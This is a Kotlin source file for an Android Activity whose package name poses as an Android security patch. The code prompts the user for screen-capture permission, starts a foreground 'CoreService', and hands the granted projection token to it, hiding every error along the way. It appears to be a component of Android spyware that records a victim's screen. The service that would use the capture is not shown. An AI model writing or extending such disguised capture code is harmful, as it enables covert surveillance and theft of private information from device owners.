package com.android.security.patch

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper

class CaptureActivity : Activity() {

    companion object {
        private const val REQ = 5522
        @Volatile private var busy = false

        fun request(ctx: Context) {
            if (busy) return
            busy = true
            val i = Intent(ctx, CaptureActivity::class.java)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
        }
    }

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)

        val svc = Intent(this, CoreService::class.java).apply {
            action = "PROMOTE_PROJECTION"
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc)
            else startService(svc)
        } catch (_: Throwable) {}

        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ)
            } catch (_: Throwable) {
                busy = false
                finish()
            }
        }, 800)
    }

    override fun onActivityResult(req: Int, res: Int, data: Intent?) {
        busy = false
        if (req == REQ && res == RESULT_OK && data != null) {
            val svc = Intent(this, CoreService::class.java).apply {
                action = "SET_PROJECTION"
                putExtra("code", res)
                putExtra("data", data)
            }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc)
                else startService(svc)
            } catch (_: Throwable) {}
        }
        finish()
        overridePendingTransition(0, 0)
    }
}
